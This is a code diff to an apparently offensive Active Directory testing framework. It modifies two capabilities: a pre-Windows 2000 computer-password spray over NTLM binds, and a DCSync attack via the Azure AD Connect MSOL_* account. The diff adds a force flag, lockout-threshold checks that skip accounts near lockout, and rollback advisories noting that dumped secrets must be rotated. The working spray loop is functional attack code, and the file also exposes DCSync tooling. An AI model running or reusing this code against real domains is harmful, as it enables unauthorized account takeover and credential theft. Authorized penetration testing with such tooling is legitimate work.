@@ -15,7 +15,13 @@ from adaf_attack.capabilities.gmsa_laps_enum import _parse_managed_password_blob
 from adaf_attack.capabilities.kerberoast import Kerberoast
 from adaf_attack.core.graph import AttackGraph
 from adaf_attack.core.impacket_helper import require_impacket
-from adaf_attack.core.ldap_ops import attr_value, finish, lookup_sam, try_ntlm_bind
+from adaf_attack.core.ldap_ops import (
+    attr_value,
+    finish,
+    lookup_sam,
+    register_advisory_rollback,
+    try_ntlm_bind,
+)
 from adaf_attack.core.ldap_util import ldap_connect
 from adaf_attack.core.session import Session
 from adaf_attack.core.target import Target
@@ -106,8 +112,21 @@ class Pre2kSpray:
         target: Target,
         session: Session,
         graph: AttackGraph,
+        *,
+        force: bool = False,
         **kwargs: Any,
     ) -> dict[str, Any]:
+        from adaf_attack.core.ldap_ops import require_force
+        from adaf_attack.core.ldap_util import ldap_connect as pdc_connect
+        from adaf_attack.core.lockout import (
+            account_lockout_state,
+            domain_has_pso,
+            effective_lockout_threshold,
+            locate_pdc_emulator,
+            read_domain_lockout_policy,
+        )
+
+        require_force("pre2k-spray", force)
         conn, base_dn, _cfg = ldap_connect(target)
         try:
             conn.search(
@@ -124,30 +143,83 @@ class Pre2kSpray:
             computers = [c for c in computers if c]
             if limit:
                 computers = computers[:limit]
-            for sam in computers:
-                candidates = [sam.rstrip("$").lower(), sam.rstrip("$"), sam.lower()]
-                hit = False
-                note = "miss"
-                for password in dict.fromkeys(candidates):
-                    ok, note = try_ntlm_bind(target, sam, password)
-                    if ok:
-                        hit = True
-                        hits.append({"sam": sam, "password_scheme": "samaccountname"})
-                        graph.add_edge(
-                            f"COMPUTER@{sam.upper()}@{target.domain.upper()}",
-                            f"COMPUTER@{sam.upper()}@{target.domain.upper()}",
-                            "Pre2kPassword",
+            policy = read_domain_lockout_policy(conn, base_dn)
+            pdc_host = locate_pdc_emulator(conn, base_dn)
+            pso_present = domain_has_pso(conn, base_dn)
+            pdc_conn, pdc_base, _pdc_cfg = pdc_connect(
+                Target(
+                    domain=target.domain,
+                    dc_ip=pdc_host,
+                    username=target.username,
+                    password=target.password,
+                    hashes=target.hashes,
+                    aes_key=target.aes_key,
+                    ccache=target.ccache,
+                    use_kerberos=target.use_kerberos,
+                    ldaps=target.ldaps,
+                    starttls=target.starttls,
+                )
+            )
+            safety_margin = int(kwargs.get("safety_margin", 2))
+            try:
+                if policy["lockout_threshold"] <= 0:
+                    raise RuntimeError(
+                        "pre2k-spray requires a verified non-zero lockoutThreshold; "
+                        "refusing when lockout policy is unavailable or disabled."
+                    )
+                for sam in computers:
+                    bad, _ts, pso_threshold = account_lockout_state(
+                        pdc_conn, pdc_base, sam, require_pso=pso_present
+                    )
+                    threshold = effective_lockout_threshold(
+                        policy["lockout_threshold"], pso_threshold
+                    )
+                    if threshold <= 0 or bad >= threshold - safety_margin:
+                        attempts.append(
+                            {
+                                "sam": sam,
+                                "ok": False,
+                                "note": "skipped_lockout",
+                                "bad_pwd_count": bad,
+                                "threshold": threshold,
+                            }
                         )
-                        console.print(f"  [green]HIT[/green] {sam}")
-                        break
-                attempts.append({"sam": sam, "ok": hit, "note": note})
+                        continue
+                    candidates = [sam.rstrip("$").lower(), sam.rstrip("$"), sam.lower()]
+                    hit = False
+                    note = "miss"
+                    for password in dict.fromkeys(candidates):
+                        ok, note = try_ntlm_bind(target, sam, password)
+                        if ok:
+                            hit = True
+                            hits.append({"sam": sam, "password_scheme": "samaccountname"})
+                            graph.add_edge(
+                                f"COMPUTER@{sam.upper()}@{target.domain.upper()}",
+                                f"COMPUTER@{sam.upper()}@{target.domain.upper()}",
+                                "Pre2kPassword",
+                            )
+                            console.print(f"  [green]HIT[/green] {sam}")
+                            break
+                    attempts.append({"sam": sam, "ok": hit, "note": note})
+            finally:
+                pdc_conn.unbind()
             result = {
                 "ok": True,
                 "attempt_count": len(attempts),
                 "hit_count": len(hits),
                 "hits": hits,
                 "attempts": attempts,
+                "pdc": pdc_host,
             }
+            register_advisory_rollback(
+                session,
+                kind="pre2k-spray",
+                target=target.domain,
+                rollback=(
+                    "Authentication attempts cannot be reversed; review lockouts and "
+                    "reset computer passwords if a pre-Windows 2000 password was confirmed."
+                ),
+            )
             return finish(session, graph, "pre2k-spray", result, hits=len(hits))
         finally:
             conn.unbind()
@@ -267,6 +339,9 @@ class AadConnectDcsync:
         force: bool = False,
         **kwargs: Any,
     ) -> dict[str, Any]:
+        from adaf_attack.core.ldap_ops import require_force
+
+        require_force("aadconnect-dcsync", force)
         conn, base_dn, _cfg = ldap_connect(target)
         try:
             conn.search(
@@ -289,6 +364,15 @@ class AadConnectDcsync:
             else:
                 result["ok"] = False
                 result["error"] = "no MSOL_* connector account found"
+            register_advisory_rollback(
+                session,
+                kind="dcsync",
+                target=str(sam or target.domain),
+                rollback=(
+                    "Replicated secrets cannot be un-replicated; rotate the MSOL_* "
+                    "connector password and any dumped hashes."
+                ),
+            )
             return finish(session, graph, "aadconnect-dcsync", result, count=len(principals))
         finally:
             conn.unbind()
